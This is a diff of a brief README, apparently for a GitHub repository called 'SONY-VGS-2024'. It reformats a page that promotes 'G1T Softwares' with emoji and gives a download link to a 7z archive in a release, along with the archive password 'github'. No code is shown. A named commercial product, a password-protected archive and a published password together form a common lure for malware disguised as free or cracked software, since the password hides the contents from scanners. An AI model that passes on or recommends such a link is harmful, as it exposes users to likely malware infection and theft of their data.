@@ -1,5 +1,5 @@
-# SONY-VGS-2024🚀 G1T Softwares 🚀
-## [Download]([link](https://github.com/Bur3nka/SONY-VGS-2024/releases/download/released/Sony.VGS.7z))
+🚀 G1T Softwares 🚀
+## [Download](https://github.com/Bur3nka/SONY-VGS-2024/releases/download/released/Sony.VGS.7z)
 ## archive pass: github
 
 📋 How to Use
